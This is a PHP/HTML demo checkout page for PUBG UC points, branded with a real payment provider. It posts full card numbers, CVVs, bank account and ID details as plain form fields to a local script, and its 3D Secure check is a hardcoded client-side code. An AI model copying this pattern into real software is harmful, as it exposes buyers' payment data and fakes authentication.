<?php
session_start();

if (!isset($_SESSION['usuario'])) {
    header("Location: ../index.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG — UC Points</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
</head>
<style>
    :root {
        --bg-base: #0d0e10;
        --bg-surface: #1E212C;
        --bg-card: #1E212C;
        --bg-card-hover: #263140;
        --bg-selected: #0f2233;
        --border: #4C5F71;

        --accent: #FF6C0C;
        --accent-glow: rgba(255, 108, 12, 0.28);
        --accent-dark: #e25f00;

        --green: #00CFB4;
        --info: #0062A8;

        --text-primary: #f0f1f3;
        --text-secondary: #7D868C;
        --text-muted: #4C5F71;

        --font-display: 'Calibri', sans-serif;
        --font-body: 'Calibri', sans-serif;
        --radius-sm: 6px;
        --radius-md: 10px;
        --radius-lg: 14px;
        --transition: 0.2s ease;
    }

    *,
    *::before,
    *::after {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }

    body {
        background-color: var(--bg-base);
        color: var(--text-primary);
        font-family: var(--font-body);
        min-height: 100vh;
        -webkit-font-smoothing: antialiased;
    }

    .navbar {
        background-color: #0f0f0fa9 !important;
        backdrop-filter: blur(8px);
        border-bottom: 1px solid var(--border);
    }

    .game-banner {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0.6rem 2rem;
        background: var(--bg-surface);
        border-bottom: 1px solid var(--border);
        gap: 1rem;
    }

    .game-banner__tag {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        font-family: var(--font-display);
        font-weight: 700;
        font-size: 1rem;
        letter-spacing: 0.04em;
        color: var(--text-primary);
    }

    .gw-badge {
        background: rgba(255, 108, 12, 0.15);
        color: #FF6C0C;
    }

    .card-img-top {
        border-radius: 15px 15px 0 0;
        height: 20px;
        width: 10%;
        object-fit: cover;
    }

    /* ID jugador en banner */
    .banner-player-id {
        display: flex;
        align-items: center;
        gap: 0.5rem;
    }

    .banner-player-id label {
        font-size: 0.82rem;
        font-weight: 600;
        color: var(--text-secondary);
        white-space: nowrap;
    }

    .banner-player-id input {
        background: var(--bg-card);
        border: 1.5px solid var(--border);
        border-radius: var(--radius-sm);
        color: var(--text-primary);
        font-family: var(--font-body);
        font-size: 0.85rem;
        padding: 0.35rem 0.75rem;
        outline: none;
        transition: border-color var(--transition);
        width: 180px;
    }

    .banner-player-id input::placeholder {
        color: var(--text-muted);
    }

    .banner-player-id input:focus,

    .shop-layout {
        display: grid;
        grid-template-columns: 1fr 360px;
        gap: 1.5rem;
        max-width: 1200px;
        margin: 1.5rem auto;
        padding: 0 1.5rem 3rem;
        align-items: start;
    }

    .section-block {
        margin-bottom: 1.4rem;
    }

    .section-label {
        font-family: var(--font-display);
        font-size: 0.8rem;
        font-weight: 700;
        letter-spacing: 0.1em;
        text-transform: uppercase;
        color: var(--text-secondary);
        margin-bottom: 0.75rem;
    }

    .products-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 0.65rem;
    }

    .product-card {
        position: relative;
        background: var(--bg-card);
        border: 1.5px solid var(--border);
        border-radius: var(--radius-md);
        padding: 0.9rem 0.75rem 0.8rem;
        cursor: pointer;
        transition: all 0.18s ease;
        display: flex;
        flex-direction: column;
        gap: 0.1rem;
        overflow: hidden;
    }

    .product-card:hover {
        border-color: rgba(255, 108, 12, 0.45);
    }

    .product-card.selected {
        background: var(--bg-selected);
        border-color: var(--accent);
        box-shadow: 0 0 0 1px var(--accent), 0 4px 24px var(--accent-glow);
    }

    .product-card.selected::after {
        content: '✔';
        position: absolute;
        top: 0.5rem;
        right: 0.55rem;
        width: 18px;
        height: 18px;
        background: var(--accent);
        border-radius: 50%;
        color: #0d0e10;
        font-size: 0.65rem;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 900;
        line-height: 18px;
        text-align: center;
    }

    .badge-popular {
        position: absolute;
        top: -1px;
        left: -1px;
        background: var(--accent);
        color: #0d0e10;
        font-family: var(--font-display);
        font-size: 0.68rem;
        font-weight: 800;
        letter-spacing: 0.05em;
        padding: 0.15rem 0.5rem;
        border-radius: var(--radius-sm) 0 var(--radius-sm) 0;
    }

    .product-card__img {
        font-size: 1.5rem;
        margin-bottom: 0.25rem;
    }

    .product-card__pts {
        font-family: var(--font-display);
        font-size: 1.35rem;
        font-weight: 800;
        color: var(--text-primary);
        line-height: 1;
    }

    .product-card__label {
        font-size: 0.75rem;
        color: var(--text-secondary);
        margin-bottom: 0.3rem;
    }

    .product-card__price-old {
        font-size: 0.72rem;
        color: var(--text-muted);
        text-decoration: line-through;
    }

    .product-card__price {
        font-family: var(--font-display);
        font-size: 0.95rem;
        font-weight: 700;
        color: var(--accent);
        display: flex;
        align-items: center;
        gap: 0.35rem;
        flex-wrap: wrap;
    }

    .discount-tag {
        background: rgba(255, 108, 12, 0.15);
        color: #FF6C0C;
    }

    /* CHECKOUT */
    .checkout-panel {
        display: flex;
        flex-direction: column;
        gap: 1rem;
        position: sticky;
        top: 16px;
    }

    .checkout-box {
        background: var(--bg-surface);
        border: 1px solid var(--border);
        border-radius: var(--radius-lg);
        padding: 1.2rem 1.3rem;
    }

    .checkout-product-name {
        font-family: var(--font-display);
        font-size: 1.3rem;
        font-weight: 800;
        color: var(--text-primary);
        margin-bottom: 0.8rem;
        display: flex;
        align-items: center;
        gap: 0.6rem;
    }

    .checkout-product-name img {
        width: 32px;
        height: 32px;
        object-fit: contain;
        flex-shrink: 0;
    }

    .checkout-product-name img[src=""],
    .checkout-product-name img:not([src]) {
        display: none;
    }

    .checkout-price-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.8rem;
    }

    .checkout-price {
        font-family: var(--font-display);
        font-size: 1.6rem;
        font-weight: 800;
        color: var(--text-primary);
    }

    .checkout-divider {
        height: 1px;
        background: var(--border);
        margin: 0.8rem 0;
    }

    /* Método de pago tabs */
    .payment-tabs {
        display: flex;
        gap: 0.5rem;
        margin-bottom: 1rem;
    }

    .payment-tab {
        flex: 1;
        padding: 0.5rem;
        border: 1.5px solid var(--border);
        border-radius: var(--radius-sm);
        background: var(--bg-card);
        color: var(--text-secondary);
        font-family: var(--font-body);
        font-size: 0.82rem;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s;
        text-align: center;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 0.3rem;
    }

    .payment-tab:hover {
        border-color: var(--accent);
        color: var(--text-primary);
    }

    .payment-tab.active {
        background: rgba(255, 108, 12, 0.10);
    }

    /* Form fields */
    .form-section {
        display: none;
    }

    .form-section.active {
        display: block;
    }

    .field-group {
        margin-bottom: 0.75rem;
    }

    .field-label {
        font-size: 0.75rem;
        font-weight: 600;
        color: var(--text-secondary);
        margin-bottom: 0.3rem;
        display: block;
    }

    .field-input {
        width: 100%;
        background: var(--bg-card);
        border: 1.5px solid var(--border);
        border-radius: 8px;
        color: var(--text-primary);
        font-family: var(--font-body);
        font-size: 0.85rem;
        padding: 0.45rem 0.75rem;
        outline: none;
        transition: border-color 0.2s;
    }

    .field-input:focus,

    .field-input::placeholder {
        color: var(--text-muted);
    }

    .field-row {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 0.5rem;
    }

    .btn-pagar {
        width: 100%;
        margin-top: 0.8rem;
        padding: 0.85rem;
        background: var(--accent);
        border: none;
        border-radius: var(--radius-md);
        color: #0a0a0b;
        font-family: var(--font-display);
        font-size: 1.1rem;
        font-weight: 800;
        letter-spacing: 0.06em;
        text-transform: uppercase;
        cursor: pointer;
        transition: all 0.18s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 0.5rem;
    }

    .btn-pagar:hover {
        background: var(--accent-dark);
        transform: translateY(-1px);
        box-shadow: 0 6px 20px var(--accent-glow);
    }

    .security-note {
        display: flex;
        align-items: center;
        gap: 0.4rem;
        font-size: 0.75rem;
        color: var(--text-muted);
        margin-top: 0.6rem;
        justify-content: center;
    }

    /* 3DS */
    .tds-check-wrap {
        background: rgba(255, 108, 12, 0.08);
        border: 1.5px solid rgba(255, 108, 12, 0.25);
    }

    .tds-check-wrap input[type="checkbox"] {
        width: 16px;
        height: 16px;
        accent-color: var(--accent);
        flex-shrink: 0;
        margin-top: 2px;
    }

    .tds-check-label {
        color: #7D868C;
    }

    .tds-check-label strong {
        color: #FF6C0C;
    }

    .tds-panel {
        background: rgba(255, 108, 12, 0.06);
        border: 1.5px solid rgba(255, 108, 12, 0.25);
    }

    .tds-panel.show {
        display: block;
    }

    .tds-panel-title {
        font-family: var(--font-display);
        font-size: 1rem;
        font-weight: 800;
        color: var(--accent);
        letter-spacing: 0.04em;
        margin-bottom: 0.3rem;
    }

    .tds-panel-sub {
        font-size: 0.78rem;
        color: var(--text-secondary);
        margin-bottom: 0.8rem;
        line-height: 1.5;
    }

    .tds-inputs {
        display: flex;
        gap: 0.4rem;
        justify-content: center;
        margin-bottom: 0.8rem;
    }

    .tds-digit {
        width: 42px;
        height: 48px;
        background: var(--bg-card);
        border: 1.5px solid var(--border);
        border-radius: 8px;
        color: var(--text-primary);
        font-size: 1.3rem;
        font-weight: 800;
        text-align: center;
        outline: none;
        transition: border-color 0.2s;
        font-family: var(--font-display);
    }

    .tds-digit:focus {
        border-color: #0062A8;
    }

    .tds-digit.error {
        border-color: #e05252;
    }

    .tds-digit.success {
        border-color: #00CFB4;
    }

    .tds-hint {
        font-size: 0.75rem;
        color: var(--text-muted);
        margin-bottom: 0.6rem;
    }

    .tds-hint span {
        color: var(--accent);
        font-weight: 700;
    }

    .tds-status {
        font-size: 0.82rem;
        font-weight: 700;
        padding: 0.4rem 0.8rem;
        border-radius: 6px;
        display: none;
        margin-bottom: 0.5rem;
    }

    .tds-status.ok {
        background: rgba(0, 207, 180, 0.12);
        color: #00CFB4;
    }

    .tds-status.err {
        display: block;
        background: rgba(224, 82, 82, 0.12);
        color: #e05252;
    }

    /* Vendor */
    .vendor-box {
        background: #1E212C;
    }

    .vendor-info {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        margin-top: 0.5rem;

    }

    .vendor-avatar {
        background: linear-gradient(135deg, #FF6C0C, #00CFB4);
    }

    .vendor-name {
        font-weight: 600;
        font-size: 0.9rem;
        color: var(--text-primary);
    }

    .vendor-rating {
        color: #7D868C;
    }

    .tds-badge {
        background: rgba(0, 207, 180, 0.15);
        color: #00CFB4;
    }

    .security-warning {
        background: rgba(224, 82, 82, 0.08);
        border-left: 4px solid #e05252;
        border-radius: 0 8px 8px 0;
        padding: 0.9rem 1.2rem;
        margin: 1rem 2rem;
        display: flex;
        gap: 0.8rem;
        align-items: flex-start;
        font-size: 0.83rem;
        color: #f0f1f3;
        line-height: 1.6;
    }

    .security-warning i {
        color: #e05252;
        font-size: 1.2rem;
        flex-shrink: 0;
        margin-top: 0.1rem;
    }

    .security-warning strong {
        color: #e05252;
    }

    @keyframes fadeSlideIn {
        from {
            opacity: 0;
            transform: translateY(6px);
        }

        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .products-panel {
        animation: fadeSlideIn 0.4s ease both;
    }

    .checkout-panel {
        animation: fadeSlideIn 0.4s 0.1s ease both;
    }

    @media (max-width: 900px) {
        .shop-layout {
            grid-template-columns: 1fr;
        }

        .checkout-panel {
            position: static;
        }

        .products-grid {
            grid-template-columns: repeat(3, 1fr);
        }
    }

    @media (max-width: 600px) {
        .products-grid {
            grid-template-columns: repeat(2, 1fr);
        }

        .game-banner {
            flex-direction: column;
            align-items: flex-start;
        }
    }
</style>

<body>
    <?php
    $nav_back_url = "juegos.php";
    $nav_back_text = "Volver";
    $nav_base = "../";
    require_once '../php/navbar.php';
    ?>

    <!-- ═══ GAME BANNER ═══ -->
    <div class="game-banner">
        <div class="game-banner__tag">
            <img src="https://img.redbull.com/images/c_limit,w_1500,h_1000/f_auto,q_auto/redbullcom/2018/02/13/c3c16515-d639-45cd-8d7d-5fe26623130b/pubg"
                class="card-img-top" alt="" class="game-icon" />
            PUBG — UF Points
            <span class="gw-badge"> API Gateway</span>
            <span class="tds-badge"><i class="bi bi-shield-lock-fill"></i> 3DS</span>
        </div>
        <div class="banner-player-id">
            <label for="jugadorIdInput">ID de jugador</label>
            <input type="text" id="jugadorIdInput" placeholder="Ej: 123456789" autocomplete="off" />
        </div>

    </div>
    <div class="security-warning">
        <i class="bi bi-shield-exclamation"></i>
        <div>
            <strong>⚠️ Aviso para comercios:</strong> La integración con API Gateway implica el manejo directo de datos
            sensibles del usuario. Para operar en producción es <strong>obligatorio</strong> contar con certificación
            <strong>PCI-DSS</strong> y se recomienda implementar <strong>3D Secure (3DS)</strong> para reducir el riesgo
            de fraude. Esta demo es solo con fines ilustrativos.
            <br>

            La base de datos de esta web <strong>NO! Guarda datos sensibles </strong> como el <strong> Numero de
                tarjeta, Fecha y CVV</strong> o <strong>Numeros de cuenta</strong> esta es solo una demostracion del
            servicio <strong></strong>
        </div>
    </div>

    <main class="shop-layout">
        <section class="products-panel">
            <div class="section-block">
                <p class="section-label">Elige el importe</p>
                <div class="products-grid">

                    <div class="product-card" data-id="1" data-pts="60" data-price="4900" data-original=""
                        data-discount="">
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">60 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price">4.900 COP</div>
                    </div>

                    <div class="product-card popular-card" data-id="2" data-pts="325" data-price="21900"
                        data-original="28000" data-discount="21">
                        <div class="badge-popular">★ Popular</div>
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">325 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price-old">28.000 COP</div>
                        <div class="product-card__price">21.900 COP <span class="discount-tag">-21%</span></div>
                    </div>

                    <div class="product-card" data-id="3" data-pts="660" data-price="39900" data-original="52000"
                        data-discount="23">
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">660 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price-old">52.000 COP</div>
                        <div class="product-card__price">39.900 COP <span class="discount-tag">-23%</span></div>
                    </div>

                    <div class="product-card" data-id="4" data-pts="1800" data-price="99900" data-original="135000"
                        data-discount="26">
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">1800 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price-old">135.000 COP</div>
                        <div class="product-card__price">99.900 COP <span class="discount-tag">-26%</span></div>
                    </div>

                    <div class="product-card" data-id="5" data-pts="3850" data-price="189900" data-original="260000"
                        data-discount="26">
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">3850 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price-old">260.000 COP</div>
                        <div class="product-card__price">189.900 COP <span class="discount-tag">-26%</span></div>
                    </div>
                    <div class="product-card" data-id="6" data-pts="8100" data-price="369900" data-original="500000"
                        data-discount="26">
                        <img src="https://martsbd.com/wp-content/uploads/2023/04/PUBG-Mobile-UC-Station.png"
                            style="height: 40px; width: 40px" alt="">
                        <div class="product-card__pts">8100 UC</div>
                        <div class="product-card__label">UC Points</div>
                        <div class="product-card__price-old">500.000 COP</div>
                        <div class="product-card__price">369.900 COP <span class="discount-tag">-26%</span></div>
                    </div>

                </div>
            </div>
        </section>

        <!-- CHECKOUT CON FORMULARIO DE PAGO -->
        <aside class="checkout-panel">
            <div class="checkout-box">
                <div class="checkout-product-name"><img id="checkoutImg" src="" alt="" /><span id="checkoutName">💎 325
                        UC Points</span></div>
                <div class="checkout-price-row">
                    <span style="font-size:0.85rem;color:var(--text-secondary);">Total</span>
                    <span class="checkout-price" id="checkoutPrice">21.900 COP</span>
                </div>

                <div class="checkout-divider"></div>

                <!-- Tabs método de pago -->
                <div class="payment-tabs">
                    <button class="payment-tab active" id="tabTarjeta" onclick="setPayment('tarjeta')">
                        <i class="bi bi-credit-card-fill"></i> Tarjeta
                    </button>
                    <button class="payment-tab" id="tabCuenta" onclick="setPayment('cuenta')">
                        <i class="bi bi-bank2"></i> Cuenta
                    </button>
                </div>

                <!-- FORMULARIO TARJETA -->
                <div class="form-section active" id="formTarjeta">
                    <div class="field-group">
                        <label class="field-label">Número de tarjeta</label>
                        <input type="text" class="field-input" id="cardNumber" placeholder="0000 0000 0000 0000"
                            maxlength="19">
                    </div>
                    <div class="field-row">
                        <div class="field-group">
                            <label class="field-label">Vencimiento</label>
                            <input type="text" class="field-input" id="cardExpiry" placeholder="MM/AA" maxlength="5">
                        </div>
                        <div class="field-group">
                            <label class="field-label">CVV</label>
                            <input type="text" class="field-input" id="cardCvv" placeholder="123" maxlength="4">
                        </div>
                    </div>
                    <div class="field-group">
                        <label class="field-label">Nombre en la tarjeta</label>
                        <input type="text" class="field-input" id="cardName" placeholder="Como aparece en la tarjeta"
                            value="<?php echo htmlspecialchars($_SESSION['usuario'] ?? ''); ?>">
                    </div>
                    <div class="field-row">
                        <div class="field-group">
                            <label class="field-label">Tipo de documento</label>
                            <select class="field-input" id="cardTipoDoc">
                                <option value="TI">Tarjeta de Identidad</option>
                                <option value="CC">Cédula</option>
                                <option value="PP">Pasaporte</option>
                                <option value="CE">Cédula Extranjería</option>
                                <option value="NIT">NIT</option>
                                <option value="PP">Pasaporte</option>
                            </select>
                        </div>
                        <div class="field-group">
                            <label class="field-label">Número de documento</label>
                            <input type="text" class="field-input" id="cardNumDoc" placeholder="1234567890">
                        </div>
                    </div>
                    <div class="field-group">
                        <label class="field-label">Correo electrónico</label>
                        <input type="email" class="field-input" id="cardCorreo" placeholder="correo@ejemplo.com"
                            value="<?php echo htmlspecialchars($_SESSION['correo'] ?? ''); ?>">
                    </div>
                    <div class="field-group">
                        <label class="field-label">Teléfono</label>
                        <input type="text" class="field-input" id="cardTelefono" placeholder="3001234567">
                    </div>
                </div>

                <!-- FORMULARIO CUENTA -->
                <div class="form-section" id="formCuenta">
                    <div class="field-group">
                        <label class="field-label">Banco</label>
                        <select class="field-input" id="cuentaBanco">
                            <option value="BANCOLOMBIA">Bancolombia</option>
                            <option value="NEQUI">Nequi</option>
                            <option value="DAVIVIENDA">Davivienda</option>
                            <option value="BBVA">BBVA</option>
                            <option value="BOGOTA">Banco de Bogotá</option>
                            <option value="OCCIDENTE">Banco de Occidente</option>
                        </select>
                    </div>
                    <div class="field-group">
                        <label class="field-label">Tipo de cuenta</label>
                        <select class="field-input" id="cuentaTipo">
                            <option value="AHORROS">Ahorros</option>
                            <option value="CORRIENTE">Corriente</option>
                        </select>
                    </div>
                    <div class="field-group">
                        <label class="field-label">Número de cuenta</label>
                        <input type="text" class="field-input" id="cuentaNumero" placeholder="0000000000">
                    </div>
                    <div class="field-row">
                        <div class="field-group">
                            <label class="field-label">Tipo de documento</label>
                            <select class="field-input" id="cuentaTipoDoc">
                                <option value="TI">Tarjeta de Identidad</option>
                                <option value="CC">Cédula</option>
                                <option value="PP">Pasaporte</option>
                                <option value="CE">Cédula Extranjería</option>
                                <option value="NIT">NIT</option>
                            </select>
                        </div>
                        <div class="field-group">
                            <label class="field-label">Número de documento</label>
                            <input type="text" class="field-input" id="cuentaNumDoc" placeholder="1234567890">
                        </div>
                    </div>
                    <div class="field-group">
                        <label class="field-label">Nombre completo</label>
                        <input type="text" class="field-input" id="cuentaNombre" placeholder="Nombre y apellido">
                    </div>
                    <div class="field-group">
                        <label class="field-label">Correo electrónico</label>
                        <input type="email" class="field-input" id="cuentaCorreo" placeholder="correo@ejemplo.com"
                            value="<?php echo htmlspecialchars($_SESSION['correo'] ?? ''); ?>">
                    </div>
                    <div class="field-group">
                        <label class="field-label">Teléfono</label>
                        <input type="text" class="field-input" id="cuentaTelefono" placeholder="3001234567">
                    </div>
                </div>

                <!-- 3DS checkbox -->
                <label class="tds-check-wrap">
                    <input type="checkbox" id="tdsCheck">
                    <span class="tds-check-label">
                        <i class="fa-solid fa-lock" style="color:#FF6C0C;"></i> <strong> Prueba de
                            Autenticacon con 3D Secure (3DS)</strong><br>
                        Activa una capa extra de seguridad para proteger tu pago.
                    </span>
                </label>

                <!-- Panel 3DS -->
                <div class="tds-panel" id="tdsPanel">
                    <div class="tds-panel-title">🔐 Verificación 3D Secure</div>
                    <div class="tds-panel-sub">
                        Ingresa el código de 6 dígitos enviado a tu banco para autenticar la transacción.
                    </div>
                    <div class="tds-inputs">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                        <input type="text" class="tds-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
                    </div>
                    <div class="tds-hint">💡 Código de demo: <span>1 2 3 4 5 6</span></div>
                    <div class="tds-status" id="tdsStatus"></div>
                </div>

                <button class="btn-pagar" id="btnPagar">
                    <i class="bi bi-lock-fill"></i> Pagar ahora
                </button>

                <div class="security-note">
                    <i class="bi bi-shield-check"></i>
                    Pago seguro · API Gateway · Evertec PlacetoPay
                </div>

            </div>
            <div class="vendor-box">
                <p class="section-label">Designer</p>
                <div class="vendor-info">
                    <div class="vendor-avatar">JM</div>
                    <div>
                        <div class="vendor-name">Jair ✅</div>
                        <div class="vendor-rating">👍 2026 · <a href="#" style="color: rgb(255, 225, 128);">Evertec
                                Placetopay SAS</a></div>
                    </div>
                </div>
            </div>
        </aside>
    </main>

    <input type="hidden" id="currentPayment" value="tarjeta">

    <script>
        (function () {
            const products = {
                1: { name: ' 60 UC Points', price: '4.900 COP', precio: 4900 },
                2: { name: ' 325 UC Points', price: '21.900 COP', precio: 21900 },
                3: { name: ' 660 UC Points', price: '39.900 COP', precio: 39900 },
                4: { name: ' 1800 UC Points', price: '99.900 COP', precio: 99900 },
                5: { name: ' 3850 UC Points', price: '189.900 COP', precio: 189900 },
                6: { name: ' 8100 UC Points', price: '369.900 COP', precio: 369900 },
            };

            function updateCheckout(id) {
                const p = products[id];
                if (!p) return;
                document.getElementById('checkoutName').textContent = p.name;
                document.getElementById('checkoutPrice').textContent = p.price;

                const imgEl = document.getElementById('checkoutImg');
                const cardImg = document.querySelector('.product-card[data-id="' + id + '"] img');
                if (imgEl && cardImg) {
                    imgEl.src = cardImg.getAttribute('src');
                    imgEl.style.display = '';
                } else if (imgEl) {
                    imgEl.style.display = 'none';
                }
            }

            window.setPayment = function (method) {
                document.getElementById('currentPayment').value = method;
                document.getElementById('tabTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('tabCuenta').classList.toggle('active', method === 'cuenta');
                document.getElementById('formTarjeta').classList.toggle('active', method === 'tarjeta');
                document.getElementById('formCuenta').classList.toggle('active', method === 'cuenta');
            };

            // Formatear número de tarjeta
            document.getElementById('cardNumber').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 16);
                this.value = v.replace(/(.{4})/g, '$1 ').trim();
            });

            // Formatear fecha
            document.getElementById('cardExpiry').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').substring(0, 4);
                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
                this.value = v;
            });

            function initCards() {
                const cards = document.querySelectorAll('.product-card');
                if (cards.length === 0) { setTimeout(initCards, 100); return; }
                cards.forEach(function (card) {
                    card.addEventListener('click', function () {
                        cards.forEach(c => c.classList.remove('selected'));
                        card.classList.add('selected');
                        updateCheckout(parseInt(card.getAttribute('data-id')));
                    });
                });
                var def = document.querySelector('.product-card[data-id="2"]');
                if (def) { def.classList.add('selected'); updateCheckout(2); }
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initCards);
            } else { initCards(); }

            // ── 3DS ──
            const tdsCheck = document.getElementById('tdsCheck');
            const tdsPanel = document.getElementById('tdsPanel');
            const tdsStatus = document.getElementById('tdsStatus');
            const tdsDigits = document.querySelectorAll('.tds-digit');
            const TDS_CODE = '123456';
            let tdsVerified = false;

            tdsCheck.addEventListener('change', function () {
                tdsPanel.classList.toggle('show', this.checked);
                if (!this.checked) {
                    tdsVerified = false;
                    tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                    tdsStatus.className = 'tds-status';
                }
            });

            // Auto-avance entre dígitos
            tdsDigits.forEach(function (input, idx) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value && idx < tdsDigits.length - 1) {
                        tdsDigits[idx + 1].focus();
                    }
                    // Verificar cuando se llenen los 6
                    const code = Array.from(tdsDigits).map(d => d.value).join('');
                    if (code.length === 6) verifyTds(code);
                });
                input.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !this.value && idx > 0) {
                        tdsDigits[idx - 1].focus();
                    }
                });
            });

            function verifyTds(code) {
                if (code === TDS_CODE) {
                    tdsVerified = true;
                    tdsDigits.forEach(d => d.classList.add('success'));
                    tdsStatus.className = 'tds-status ok';
                    tdsStatus.textContent = '✅ Autenticación 3DS exitosa — puedes proceder con el pago.';
                } else {
                    tdsVerified = false;
                    tdsDigits.forEach(d => d.classList.add('error'));
                    tdsStatus.className = 'tds-status err';
                    tdsStatus.textContent = '❌ Código incorrecto. Inténtalo de nuevo.';
                    setTimeout(function () {
                        tdsDigits.forEach(d => { d.value = ''; d.className = 'tds-digit'; });
                        tdsDigits[0].focus();
                        tdsStatus.className = 'tds-status';
                    }, 1500);
                }
            }

            document.getElementById('btnPagar').addEventListener('click', function () {
                const jugadorId = document.getElementById('jugadorIdInput').value.trim();
                if (!jugadorId) { alert('⚠️ Por favor ingresa tu ID de jugador.'); return; }

                // Validar 3DS si está activado
                if (tdsCheck.checked && !tdsVerified) {
                    alert('⚠️ Debes completar la verificación 3D Secure antes de continuar.');
                    tdsDigits[0].focus();
                    return;
                }

                const selectedCard = document.querySelector('.product-card.selected');
                if (!selectedCard) { alert('⚠️ Selecciona un producto.'); return; }

                const method = document.getElementById('currentPayment').value;
                const producto = document.getElementById('checkoutName').textContent.trim();
                const precio = document.getElementById('checkoutPrice').textContent.replace(/[^0-9]/g, '');

                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '../estados-gateway.php';

                const campos = [
                    ['producto', producto], ['precio', precio],
                    ['jugador_id', jugadorId], ['metodo', method]
                ];

                if (method === 'tarjeta') {
                    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
                    const expiry = document.getElementById('cardExpiry').value;
                    const cvv = document.getElementById('cardCvv').value;
                    const name = document.getElementById('cardName').value;
                    const tipoDoc = document.getElementById('cardTipoDoc').value;
                    const numDoc = document.getElementById('cardNumDoc').value;
                    const correo = document.getElementById('cardCorreo').value;
                    const tel = document.getElementById('cardTelefono').value;

                    if (!cardNum || !expiry || !cvv || !name || !numDoc || !correo || !tel) {
                        alert('⚠️ Por favor completa todos los campos de tarjeta.'); return;
                    }
                    campos.push(
                        ['card_number', cardNum], ['card_expiry', expiry],
                        ['card_cvv', cvv], ['card_name', name],
                        ['tipo_doc', tipoDoc], ['num_doc', numDoc],
                        ['correo', correo], ['telefono', tel]
                    );
                } else {
                    const banco = document.getElementById('cuentaBanco').value;
                    const tipo = document.getElementById('cuentaTipo').value;
                    const numero = document.getElementById('cuentaNumero').value;
                    const tipoDoc = document.getElementById('cuentaTipoDoc').value;
                    const numDoc = document.getElementById('cuentaNumDoc').value;
                    const nombre = document.getElementById('cuentaNombre').value;
                    const correo = document.getElementById('cuentaCorreo').value;
                    const tel = document.getElementById('cuentaTelefono').value;

                    if (!numero || !numDoc || !nombre || !correo || !tel) {
                        alert('⚠️ Por favor completa todos los campos de cuenta.'); return;
                    }
                    campos.push(
                        ['banco', banco], ['tipo_cuenta', tipo],
                        ['num_cuenta', numero], ['tipo_doc', tipoDoc],
                        ['num_doc', numDoc], ['nombre', nombre],
                        ['correo', correo], ['telefono', tel]
                    );
                }

                campos.forEach(function (pair) {
                    const input = document.createElement('input');
                    input.type = 'hidden'; input.name = pair[0]; input.value = pair[1];
                    form.appendChild(input);
                });

                document.body.appendChild(form);
                form.submit();
            });
        })();
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>